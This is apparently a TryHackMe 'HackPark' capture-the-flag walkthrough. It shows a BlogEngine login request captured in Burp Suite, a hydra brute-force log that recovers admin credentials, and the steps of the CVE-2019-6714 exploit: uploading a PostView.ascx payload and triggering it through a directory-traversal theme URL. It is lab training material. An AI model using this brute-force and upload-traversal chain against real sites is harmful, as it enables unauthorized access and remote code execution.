---
sidebar_position: 2
description: HackPark
keywords: [hackpark, hackpark tryhackme, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, privilege escalation, burpsuite, hydra, blogengine, CVE-2019-6714]
---

# BlogEngine

## BURPSUITE

- <b style={{ color: 'SandyBrown' }}>[IP:80/Account/login.aspx?ReturnURL=/admin/]</b>
- We can Intercept the Login Request with `Burpsuite ->> Proxy ->> Intercept ON` in Order to attempt a **Brute-Force** Attack with `hydra`.

```log
POST /Account/login.aspx?ReturnURL=%2fadmin%2f HTTP/1.1
Host: 10.10.76.79
Referer: http://10.10.76.79/Account/login.aspx?ReturnURL=/admin/

__VIEWSTATE=R5udoO0ZPM2lxCztLZomfdn6ZP5j6MY3A3pH5JFIY0EUS8BhyKHXd7JTKJl8UEXmTi%2FMrwZY0gzNjOpSQ6fs%2F4PZeRk3PIobUvCV%2Fc9MdGIDGBdB%2FybftEP8Ppc%2BlrxVQxpoZFr4UUx0MRmdWiac%2BcimUDnxupmDkjWqC332LWa5f5pw&__EVENTVALIDATION=RBfvevREoLvXTy6kxTyAy%2B5%2B%2F0jCzpxH049zWxZZ6YzGWBsJwCQhfdodzY%2FgoDS%2F4KiZ%2BYVeDAJ91ALKTm6HsT5lDMESMjC2qchfoC6LTm5lCVDNwlW4q1qZapDuxuB20bTIjW%2F3J6Q0mPZhcPDxpHfnCzA3zELIcK0EmjlXeq8Lz0gg&ctl00%24MainContent%24LoginUser%24UserName=admin&ctl00%24MainContent%24LoginUser%24Password=pass&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in
```


## HYDRA

-  **Brute-Forcing `Login Form`:** <b style={{ color: 'Chartreuse' }}>admin</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>1qaz2wsx</b>

```log
[DATA] attacking http-post-form://10.10.76.79:80/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=R5udoO0ZPM2lxCztLZomfdn6ZP5j6MY3A3pH5JFIY0EUS8BhyKHXd7JTKJl8UEXmTi%2FMrwZY0gzNjOpSQ6fs%2F4PZeRk3PIobUvCV%2Fc9MdGIDGBdB%2FybftEP8Ppc%2BlrxVQxpoZFr4UUx0MRmdWiac%2BcimUDnxupmDkjWqC332LWa5f5pw&__EVENTVALIDATION=RBfvevREoLvXTy6kxTyAy%2B5%2B%2F0jCzpxH049zWxZZ6YzGWBsJwCQhfdodzY%2FgoDS%2F4KiZ%2BYVeDAJ91ALKTm6HsT5lDMESMjC2qchfoC6LTm5lCVDNwlW4q1qZapDuxuB20bTIjW%2F3J6Q0mPZhcPDxpHfnCzA3zELIcK0EmjlXeq8Lz0gg&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed
[80][http-post-form] host: 10.10.76.79   login: admin   password: 1qaz2wsx
```

<br/>

---
## Content Discovery

- We can Login using the Cracked Credentials: <b style={{ color: 'Chartreuse' }}>admin</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>1qaz2wsx</b>
- **`BlogEngine`** **Version:** <b style={{ color: 'Plum' }}>3.3.6.0</b> <b style={{ color: 'Red' }}>Vulnerable (CVE-2019-6714)</b>

![HP](/img/vmwindows/h-hackparkversion.png)


<br/>

- **Used Exploit** <b style={{ color: 'Red' }}>DB-ID: 46353</b>
- `[1]` Setting: <span style={{fontWeight: 'Bold'}}>HOST - PORT</span> - Starting a Listener on the <span style={{fontWeight: 'Bold'}}>PORT</span>
- `[2]` Uploading the **PAYLOAD** using the `BlogEngine File Manager`. This is done by Editing a Post and Clicking on the <span style={{fontWeight: 'Bold'}}>Icon</span> that Looks like a <span style={{fontWeight: 'Bold'}}>Folder.</span>
- `[3]` The <span style={{fontWeight: 'Bold'}}>PAYLOAD</span> must be Named as <b style={{ color: 'DeepSkyBlue' }}>PostView.ascx</b> 
- `[4]` The <span style={{fontWeight: 'Bold'}}>PAYLOAD</span> can be Executed by visiting the Following <span style={{fontWeight: 'Bold'}}>URL:</span> `http://10.10.76.79/?theme=../../App_Data/files`


![HP](/img/vmwindows/h-hackparkupload.png)


---